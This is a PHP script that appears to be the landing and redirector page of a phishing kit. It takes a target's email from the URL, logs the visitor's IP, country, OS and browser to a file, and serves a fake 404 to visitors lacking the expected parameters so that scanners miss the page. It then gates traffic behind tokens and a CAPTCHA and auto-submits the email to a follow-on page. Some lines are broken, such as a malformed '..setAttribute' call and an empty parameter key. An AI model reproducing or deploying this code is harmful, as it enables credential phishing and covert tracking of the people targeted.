<?php
session_start();
include('css/css1.php');
include('css/css2.php');
include('css/css3.php');
include('css/css4.php');
include('css/css5.php');
require 'config.php';
require 'funcations.php';
if (!isset($_GET['referrer']) && empty($_GET['referrer'])&&!isset($_GET['csrftoken'])) {
     exit(header('HTTP/1.0 404 Not Found'));
}

$viclang = getLanguage();
$_SESSION['language']=getLanguage();
$_SESSION['ip']=clientData('ip');
$_SESSION['ip_countryName']=clientData('country');
$_SESSION['os']=getOs();
$_SESSION['browser']=getBrowser();
if (isset($_GET['referrer'])) {
	if ("no" == "yes") {
$_GET['referrer'] = base64_decode($_GET['referrer']);
}
$_SESSION['email']=$_GET['referrer'];
$vicref=$_GET['referrer'];

    if(1==1) {

	date_default_timezone_set('GMT');
	$dateNow=date("d/m/Y h:i:s A");
	$code="{$_SESSION['ip']} | {$dateNow} | {$_SESSION['ip_countryName']} | {$_SESSION['os']} | {$_SESSION['browser']} | {$_SESSION['referrer']}\r\n";
	$save=fopen("log.txt","a+");
	fwrite($save,$code);
	fclose($save);
	$csrftoken = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
	$_SESSION['csrftoken'] = $csrftoken;
		exit(header("Location: ?csrftoken=".$_SESSION['csrftoken'].""));
	}
$_SESSION['referrer'] = $vicref;
}
if(isset($_SESSION['csrftoken'])){
if ($_SESSION['csrftoken'] !== $_GET['csrftoken']) {
	     exit(header('HTTP/1.0 404 Not Found'));
	     }
 if ($_SESSION['csrftoken'] == $_GET['csrftoken']) {
 	if ($show_captchaa!=="yes") {
	$newtoken = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
	$_SESSION['newtoken'] = $newtoken;
		exit(header("Location: home?newtoken=".$_SESSION['newtoken']."&email=".$_GET[''].""));
 	?>
<?php }else{
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
<script src="https://www.google.com/recaptcha/api.js?render=<?php echo $captcha_site_key ?>"></script>
<script>
    grecaptcha.ready(function() {
        grecaptcha.execute('<?php echo $captcha_site_key ?>', {action:'validate_captcha'})
                  .then(function(token) {
            document.getElementById('g-recaptcha-response').value = token;
        });
    });
</script>
<style>
.hideme
{
    display:none;
    visibility:hidden;
}
</style>
</head>
    <form action="home" id="myform" name="myform" method="POST">
    <input type="hidden" id="g-recaptcha-response" name="g-recaptcha-response">
    <input type="hidden" name="email" value="<?php echo $_SESSION['email']; ?>">
    <input type="hidden" name="hidden" value="<?php echo $_SESSION['email']; ?>">
    <input type="Submit" name="Submit" class="hideme">
</form>
<script type="text/javascript">
	document.getElementById('g-recaptcha-response')..setAttribute("value", token);‏

</script>
<script type="text/javascript">
window.onload=function(){ 
    window.setTimeout(document.myform.submit.bind(document.myform), 2000);
};
 </script>

</body>
</html>
<?php
session_destroy();
}
}
}else{
		     exit(header('HTTP/1.0 404 Not Found'));

}
?>